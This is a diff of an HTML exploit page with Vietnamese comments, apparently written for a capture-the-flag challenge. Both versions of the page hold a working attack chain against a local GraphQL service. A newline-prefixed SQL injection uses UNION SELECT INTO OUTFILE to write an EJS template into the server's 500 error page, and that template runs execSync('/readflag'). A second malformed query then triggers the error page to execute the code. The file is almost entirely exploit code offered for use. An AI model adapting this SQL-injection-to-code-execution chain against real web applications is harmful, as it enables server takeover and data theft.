@@ -1,72 +1,72 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Pwned Report</h1>
-    <div id="result">Waiting for flag...</div>
+    <h1>CTF Exploit Output</h1>
+    <div id="log">Running...</div>
     <script>
-        // Token Admin bạn đã tạo được từ bước trước
-        const token = "YOUR_ADMIN_TOKEN_HERE"; 
-        const graphqlUrl = "http://127.0.0.1:42744/graphql?token=" + token;
-
-        // Payload SQL Injection
-        // 1. \n : Bypass filter regex
-        // 2. ' UNION SELECT : Kết thúc query cũ, bắt đầu query mới
-        // 3. EJS Payload: Mã độc Node.js để chạy /readflag
-        // 4. INTO OUTFILE: Ghi nội dung xuống file template lỗi 500
+        // --- CẤU HÌNH ---
+        // 1. Thay token này bằng Admin Token bạn tạo được (sau khi chạy Step 1 của Python)
+        const ADMIN_TOKEN = "THAY_TOKEN_ADMIN_VAO_DAY"; 
         
-        const ejsPayload = `<% 
-            const { execSync } = require("child_process"); 
-            try {
-                const flag = execSync("/readflag").toString(); 
-                %><%= flag %><% 
+        // 2. Port nội bộ (thường trùng với port bài thi bên ngoài: 42744)
+        const PORT = 42744; 
+        
+        const TARGET = `http://127.0.0.1:${PORT}/graphql?token=${ADMIN_TOKEN}`;
+
+        // --- PAYLOAD ---
+        // Mã độc EJS: Chạy /readflag và in kết quả
+        const EJS_SHELL = `<% 
+            try { 
+                const r = require('child_process').execSync('/readflag').toString(); 
+                %><%= r %><% 
             } catch(e) { 
                 %><%= e.message %><% 
             } 
         %>`;
 
-        // SQL Injection đầy đủ
-        // Cấu trúc bảng users có 4 cột (id, name, department, isPresent) nên ta select 4 giá trị.
-        // Cột thứ 2 (name) là chuỗi, ta nhét payload vào đây.
-        const sqlPayload = `\n' UNION SELECT 1, '${ejsPayload}', 'dept', 1 INTO OUTFILE '/app/views/errors/500.ejs' -- -`;
+        // SQL Injection: Bypass filter bằng \n, ghi EJS vào file template lỗi 500
+        // Cấu trúc bảng users: id, name, department, isPresent (4 cột)
+        const SQL_INJECT = `\n' UNION SELECT 1, '${EJS_SHELL}', 'hacker', 1 INTO OUTFILE '/app/views/errors/500.ejs' -- -`;
 
-        const queryWriteFile = {
-            "query": `query { getDataByName(name: "${sqlPayload}") { name } }`
+        // Query 1: Ghi file
+        const q1 = { "query": `query { getDataByName(name: "${SQL_INJECT}") { name } }` };
+        
+        // Query 2: Kích hoạt lỗi (render file 500.ejs)
+        const q2 = { "query": `query { getDataByName(name: "'") { name } }` };
+
+        const log = (msg) => {
+            document.getElementById('log').innerHTML += "<br>" + msg;
+            document.body.innerHTML += "<br><pre>" + msg + "</pre>"; // In ra để PDF chụp lại
         };
 
-        const queryTriggerError = {
-            "query": `query { getDataByName(name: "'") { name } }` // Gửi dấu ' để gây lỗi 500 SQL syntax
-        };
-
-        async function exploit() {
+        async function pwn() {
             try {
-                // Bước 1: Gửi SQLi để ghi file mã độc
-                await fetch(graphqlUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(queryWriteFile)
+                log("[1] Sending SQL Injection to write shell...");
+                await fetch(TARGET, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(q1)
                 });
 
-                // Chờ 1 chút để file kịp ghi (file I/O)
-                await new Promise(r => setTimeout(r, 1000));
+                // Chờ file system sync
+                await new Promise(r => setTimeout(r, 1500));
 
-                // Bước 2: Gửi request gây lỗi để server render file 500.ejs
-                // Lúc này server sẽ chạy code trong 500.ejs và trả về Flag
-                const res = await fetch(graphqlUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(queryTriggerError)
+                log("[2] Triggering Error to execute shell...");
+                let res = await fetch(TARGET, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(q2)
                 });
 
-                const text = await res.text();
-                document.getElementById("result").innerText = text;
-                document.body.innerHTML += "<br><pre>" + text + "</pre>";
-
+                let text = await res.text();
+                log("--- RESULT ---");
+                log(text); // Flag sẽ hiện ở đây
             } catch (e) {
-                document.getElementById("result").innerText = "Error: " + e;
+                log("Error: " + e);
             }
         }
 
-        exploit();
+        pwn();
     </script>
 </body>
 </html>
